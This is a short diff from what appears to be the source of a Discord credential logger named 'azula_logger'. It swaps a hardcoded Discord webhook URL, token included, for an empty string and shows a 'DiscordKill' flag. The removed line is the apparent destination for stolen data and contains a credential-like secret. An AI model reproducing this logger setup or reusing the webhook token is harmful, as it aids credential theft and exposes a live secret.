@@ -27,7 +27,7 @@ namespace azula_logger
         static void Main(string[] args)
         {
             //making webhook url & image a string so u dont have to change it everywhere
-            string webhook = "https://discordapp.com/api/webhooks/771479315505348670/IeeW88Ig_jojTE82M1M-9MCErp8wA0uUfVboNQO0_bS_fSG6I-jyJZNe-zVcDPSBI_5s";
+            string webhook = "";
             string image = "";
             bool DiscordKill = false;
             Task.Run(() =>
